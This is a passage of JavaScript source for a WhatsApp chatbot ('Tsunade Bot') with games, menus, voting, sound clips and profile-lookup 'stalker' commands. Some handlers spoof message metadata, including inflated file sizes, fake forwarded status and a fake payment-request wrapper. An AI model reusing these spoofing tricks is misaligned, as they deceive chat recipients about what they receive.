"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replygcmznking(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await TsunadeBot.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await TsunadeBot.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replygcmznking('Waiting For Partner' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            TsunadeBot.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replygcmznking(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replygcmznking('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcmznking(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replygcmznking(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replygcmznking(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcmznking(`The person you are challenging is playing suit with someone else :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Please type accept to accept or type reject to reject`
            this.suit[id] = {
            chat: await TsunadeBot.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) TsunadeBot.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	case 'public': {
                if (!MznKingTheCreator) return MznKingOwnerReply()
                TsunadeBot.public = true
                replygcmznking('📣 *Bot mode changed to public.*')
            }
            break
            case 'self': case 'private': {
                if (!MznKingTheCreator) return MznKingOwnerReply()
                TsunadeBot.public = false
                replygcmznking('🔒 *Bot mode changed to private.*')
            }
            break
case 'tempbot': {
if (m.isGroup) return MznKingPrivateReply()
if (!MznKingTheCreator) return MznKingOwnerReply()
rentfrommznking(TsunadeBot, m, from)
}
break
case 'tempbotlist': 
try {
let user = [... new Set([...global.conns.filter(TsunadeBot => TsunadeBot.user).map(TsunadeBot => TsunadeBot.user)])]
te = "*Temporary Bot List*\n\n"
for (let i of user){
y = await TsunadeBot.decodeJid(i.id)
te += " × *User:* @" + y.split("@")[0] + "\n"
te += " × *Name:* " + i.name + "\n\n"
}
TsunadeBot.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcmznking(`*There are no users connected to Temporary bot.*`)
}
break
case 'shutdown':
if (!MznKingTheCreator) return MznKingOwnerReply()
replygcmznking(`⛔ *Shutting down...*`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await TsunadeBot.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
TsunadeBot.sendMessage(from, { text : `1. 📧 Use clear subject lines when emailing.\n2. ⏰ Respect the owner's time.
3. 📞 Call at appropriate hours.\n4. ✉️ Clearly state the purpose.
5. 📝 Keep messages brief.\n6. 😊 Maintain a polite tone.\n7. 🙅‍♂️ Avoid excessive messages.\n\nFollowing these guidelines will help ensure effective and respectful communication with the owner.`, mentions: [sender]}, { quoted: repf })
}
break
case 'alive': {
	        let ownernya = ownernumber + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            mznkingezy = `\`\`\`👋 Hello ${pushname}, ${mznkingztimewisher}. Bot is alive now 🧚❤️\`\`\`

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


Type *menu* to get command list. 📝`
            let ments = [ownernya, me, mark]        
           TsunadeBot.sendMessage(from, { 
text: mznkingezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/theme/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
           break
case 'allmenu': case 'menu': {
var unicorn = await getBuffer(picak+'All Menu')
sendMznKingBotMessage(from, { 
text: `${allmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ownermenu': {
var unicorn = await getBuffer(picak+'Owner Menu')
sendMznKingBotMessage(from, { 
text: `${ownermenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'mainmenu': {
var unicorn = await getBuffer(picak+'Main Menu')
sendMznKingBotMessage(from, { 
text: `${mainmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'downloadmenu': case 'dlmenu': {
var unicorn = await getBuffer(picak+'Download Menu')
sendMznKingBotMessage(from, { 
text: `${dlmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'groupmenu': case 'gcmenu': {
var unicorn = await getBuffer(picak+'Group Menu')
sendMznKingBotMessage(from, { 
text: `${gcmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'entertainmentmenu': case 'funmenu': {
var unicorn = await getBuffer(picak+'Fun Menu')
sendMznKingBotMessage(from, { 
text: `${funmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stalkermenu': case 'stalkmenu': {
var unicorn = await getBuffer(picak+'Stalker Menu')
sendMznKingBotMessage(from, { 
text: `${stalkermenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randommenu': case 'randmenu': case 'randomenu': {
var unicorn = await getBuffer(picak+'Random Menu')
sendMznKingBotMessage(from, { 
text: `${randommenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'txtlogomenu': case 'textlogomenu': case 'textlogo': case 'txtlogo': {
var unicorn = await getBuffer(picak+'Text Logo Menu')
sendMznKingBotMessage(from, { 
text: `${textlogomenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'nsfwmenu': case 'nsfwanime': case 'nsfwcmd': {
var unicorn = await getBuffer(picak+'NSFW Menu')
sendMznKingBotMessage(from, { 
text: `${nsfwmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stickermenu': case 'stickmenu': {
var unicorn = await getBuffer(picak+'Sticker Menu')
sendMznKingBotMessage(from, { 
text: `${stickermenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'databasemenu': case 'dbmenu': {
var unicorn = await getBuffer(picak+'Database Menu')
sendMznKingBotMessage(from, { 
text: `${databasemenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'aimenu': {
var unicorn = await getBuffer(picak+'AI Menu')
sendMznKingBotMessage(from, { 
text: `${aimenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'banmenu': case 'unbanmenu': {
var unicorn = await getBuffer(picak+'WhatsApp Menu')
sendMznKingBotMessage(from, { 
text: `${whatsappmenu}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./assets/media/images/TsunadeBot-1.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
TsunadeBot_dev = await getBuffer(`https://github.com/mznking/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await TsunadeBot.sendMessage(m.chat, { audio: TsunadeBot_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await MznKingWaitReply()
let teman = pickRandom(mznkingverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcmznking('Managed to Get One Person')
}, 5000)
setTimeout(() => {
TsunadeBot.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'repo': case 'repository': case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
	const githubRepoURL = 'https://github.com/mznking/TsunadeBot-MD'
  try {
    const [, username, repoName] = githubRepoURL.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
📂 *Repository Name:* ${repoData.name}
📝 *Description:* ${repoData.description}
👤 *Owner:* ${repoData.owner.login}
⭐ *Stars:* ${repoData.stargazers_count}
🍴 *Forks:* ${repoData.forks_count}
🌐 *URL:* ${repoData.html_url}
     
*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`.trim()
      await TsunadeBot.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    } else {
      await replygcmznking(`*Unable to fetch repository information.*`)
    }
  } catch (error) {
    console.error(error)
    await replygcmznking(`*An error occurred while fetching repository information.*`)
  }
}
break
case 'report': case 'reportbug': {
	if (!text) return replygcmznking(`❓ *Write the error message in Tsunade Bot.\nFor example: *.report YouTube video downloader is not working properly*`)
            textt = `${errorReply}`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Error* : ${text}`
            teks2 = `✅ *Your bug report is sent to our developers. They will fix it soon!*\n\nUser: @${m.sender.split("@")[0]}\n⚠️ Error: ${text}\n\n*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`
            for (let i of owner) {
                TsunadeBot.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            TsunadeBot.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
case 'q': case 'quoted': {
if (!m.quoted) return replygcmznking('*Please reply to a message*')
let mznkingquotx= await TsunadeBot.serializeM(await m.getQuotedObj())
if (!mznkingquotx.quoted) return replygcmznking('❌ *The message you are replying is not sent by the bot.*')
await mznkingquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2': {

if (!q) return replygcmznking(`❓ *Please enter valid instagram username for get details!*\nFor example: *${prefix+command} mznkingofc*`)
await MznKingWaitReply()
const aj = await igstalk(`${q}`)
TsunadeBot.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`🧚‍♀️ *Tsunade Instagram Stalker* 🧚‍♀️

👤 *Name:* ${aj.fullname}
📝 *Username:* ${aj.username}
📄 *Posts:* ${aj.post}
👥 *Followers:* ${aj.followers}
👣 *Following:* ${aj.following}
📄 *Bio:* ${aj.bio}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*` }, { quoted: m } )
}
break
case 'ffstalk':{

if (!q) return replygcmznking(`❓ *Please enter valid freefire id number for get details!*\nFor example: *${prefix+command} 123456789*`)
await MznKingWaitReply()
eeh = await ffstalk.ffstalk(`${q}`)
replygcmznking(`🧚‍♀️ *Tsunade FreeFire Stalker* 🧚‍♀️

🆔 *ID:* ${eeh.id}
📛 *Nickname:* ${eeh.nickname}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`)
}
break
case 'mlstalk': {

if (!q) return replygcmznking(`❓ *Please enter valid freefire id number for get details!*\nFor example: *${prefix+command} 123212321|1232*`)
await MznKingWaitReply()
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcmznking(`🧚‍♀️ *Tsunade Mobile Legend Stalker* 🧚‍♀️

👤 *Username:* ${dat.username}
🆔 *ID:* ${q.split("|")[0]}
🌐 *ID Zone:* ${q.split("|")[1]}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`)
}
break
case 'npmstalk':{
if (!q) return replygcmznking(`❓ *Please enter valid npmjs library name for get details!*\nFor example: *${prefix+command} mznkingapi`)
await MznKingWaitReply()
eha = await npmstalk.npmstalk(q)
replygcmznking(`🧚‍♀️ *Tsunade Npmjs Stalker* 🧚‍♀️

📦 *Name :* ${eha.name}
🚀 *Version Latest :* ${eha.versionLatest}
📅 *Version Publish :* ${eha.versionPublish}
🔄 *Version Update :* ${eha.versionUpdate}
📋 *Latest Dependencies :* ${eha.latestDependencies}
📋 *Publish Dependencies :* ${eha.publishDependencies}
🕒 *Publish Time :* ${eha.publishTime}
🕒 *Latest Publish Time :* ${eha.latestPublishTime}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcmznking(`❓ *Please enter valid github username for get details!*\nFor example: *${prefix+command} mznking`)
await MznKingWaitReply()
aj = await githubstalk.githubstalk(`${q}`)
TsunadeBot.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`🧚‍♀️ *Tsunade Github Stalker* 🧚‍♀️

👤 *Username:* ${aj.username}
📛 *Nickname:* ${aj.nickname}
📝 *Bio:* ${aj.bio}
🆔 *ID:* ${aj.id}
🔗 *Node ID:* ${aj.nodeid}
🖼️ *Url Profile:* ${aj.profile_pic}
🌐 *Url Github:* ${aj.url}
➡️ *Type:* ${aj.type}
👑 *Admin:* ${aj.admin}
🏢 *Company:* ${aj.company}
📝 *Blog:* ${aj.blog}
📍 *Location:* ${aj.location}
✉️ *Email:* ${aj.email}
📚 *Public Repo:* ${aj.public_repo}
📘 *Public Gists:* ${aj.public_gists}
👥 *Followers:* ${aj.followers}
👣 *Following:* ${aj.following}
📅 *Created at:* ${aj.ceated_at}
🔄 *Updated at:* ${aj.updated_at}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcmznking(`❓ *Please enter valid url for take screenshot!*\nFor example: *${prefix+command} https://github.com/mznking`)
await MznKingWaitReply()
let krt = await scp1.ssweb(q)
TsunadeBot.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'join': {
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!text) return replygcmznking(`❓ *Please enter valid group link for join!*\nFor example: *${prefix+command} https://chat.whatsapp.com/`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcmznking('❌ *Invalid url.*')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await TsunadeBot.groupAcceptInvite(result)
await replygcmznking(`✅ *Done!*`)
}
break
case 'poll': {
	if (!MznKingTheCreator) return MznKingOwnerReply()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcmznking(
                    `❓ Please enter correct vote arguments!\nFor example: *${prefix}poll What is your favourite pet|🐿️ Squirrel,🐢 Tortoise`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await TsunadeBot.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return MznKingGroupReply()
            if (m.chat in vote) return replygcmznking(`*There is already a vote active in this chat.*\n\n${prefix}deletevote - to delete vote!`)
            if (!text) return replygcmznking(`*Please enter a reason for create voting?*\nFor example: ${prefix + command} Is Tsunade best bot?`)
            replygcmznking(`*Vote Poll created✅*\n\n*You can vote now!🧚♥️*\n\n\`\`\`${prefix}upvote - for upvote\n${prefix}downvote - for downvote\n${prefix}checkvote - to check the vote\n${prefix}deletevote - to delete vote\`\`\``)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `🧚 *Tsunade Vote Results* 🧚

❓ *Reason:* ${vote[m.chat][0]}
👍 *Upvotes:* ${vote[m.chat][1].length}
👎 *Downvotes:* ${vote[m.chat][2].length}

⬇️ Please use below commands,
\`\`\`${prefix}upvote - to cast vote
${prefix}downvote -  to downvote
${prefix}deletevote - to delete vote\`\`\``
            TsunadeBot.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
        case 'vote': {
            if (!m.isGroup) return MznKingGroupReply();
            if (m.chat in vote) return replygcmznking(`*There is already a vote active in this chat.*\n\n${prefix}deletevote - to delete vote!`);
            if (!text) return replygcmznking(`*Please enter a reason for creating voting?*\nFor example: ${prefix + command} Is Tsunade the best bot?`);
            replygcmznking(`*Vote Poll created✅*\n\n*You can vote now!🧚♥️*\n\n\`\`\`${prefix}upvote - for upvote\n${prefix}downvote - for downvote\n${prefix}checkvote - to check the vote\n${prefix}deletevote - to delete vote\`\`\``);
            vote[m.chat] = [text, [], []];
            await sleep(1000);
            upvote = vote[m.chat][1];
            devote = vote[m.chat][2];
            teks_vote = `🧚 *Tsunade Vote Results* 🧚

❓ *Reason:* ${vote[m.chat][0]}
👍 *Upvotes:* ${vote[m.chat][1].length}
👎 *Downvotes:* ${vote[m.chat][2].length}

⬇️ Please use below commands,
\`\`\`${prefix}upvote - to cast vote
${prefix}downvote -  to downvote
${prefix}deletevote - to delete vote\`\`\``;
            TsunadeBot.sendMessage(m.chat, { text: teks_vote }, { quoted: m });
        }
             break
                case 'downvote': {
                    if (!m.isGroup) return MznKingGroupReply();
                    if (!(m.chat in vote)) return replygcmznking(`*No active votings in the group.*\nFor example: ${prefix}vote - to start voting`);
                    isVote = vote[m.chat][1].concat(vote[m.chat][2]);
                    wasVote = isVote.includes(m.sender);
                    if (wasVote) return replygcmznking('*You\'ve already voted!*');
                    vote[m.chat][2].push(m.sender);
                    menvote = vote[m.chat][1].concat(vote[m.chat][2]);
                    teks_vote = `🧚 *Tsunade Vote Results* 🧚
                
❓ *Reason:* ${vote[m.chat][0]}

👍 *Upvotes:* ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}

👎 *Downvotes:* ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}

⬇️ Please use the below commands,
\`\`\`${prefix}upvote - to upvote
${prefix}downvote -  to downvote
${prefix}deletevote - to delete vote\`\`\``;
                    TsunadeBot.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted: m}); 
}
            break
                 
case 'checkvote':
    if (!m.isGroup) return MznKingGroupReply();
    if (!(m.chat in vote)) return replygcmznking(`No active votings in the group.*\nFor example: ${prefix}vote - to start voting`);
    teks_vote = `🧚 *Tsunade Vote Results* 🧚

❓ *Reason:* ${vote[m.chat][0]}

👍 *Upvotes:* ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split('@')[0]}`).join('\n')}

👎 *Downvotes:* ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split('@')[0]}`).join('\n')}

*${prefix}deletevote* - to delete votes


© ${TsunadeBot.user.id}
`;
    TsunadeBot.sendTextWithMentions(m.chat, teks_vote, m);
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return MznKingGroupReply()
            if (!(m.chat in vote)) return replygcmznking(`No active votings in the group.*\nFor example: ${prefix}vote - to start voting`)
            delete vote[m.chat]
            replygcmznking('✅ *Vote session was successfully deleted in this chat!*')
	    }
            break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcmznking(`*Reply to any video/image!*`)
await MznKingWaitReply()
if (/image/.test(mime)) {
anuan = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
TsunadeBot.sendMessage(m.chat, {image: {url:anuan}, caption: `*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
TsunadeBot.sendMessage(m.chat, {video: {url:anuanuan}, caption: `*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcmznking(`*Please provide a text for flip.*\nFor example: ${prefix}fliptext Tsunade Bot`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcmznking(`\`\`\`『 FLIP TEXT 』\`\`\`\n*➢ Original:*\n${quere}\n*➢ Flip :*\n${flipe}`)
}
break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `🧚 *Personal Chats List*\n\n💬 *Total Chats:* ${anulistp.length} chats\n\n`
                 for (let i of anulistp) {
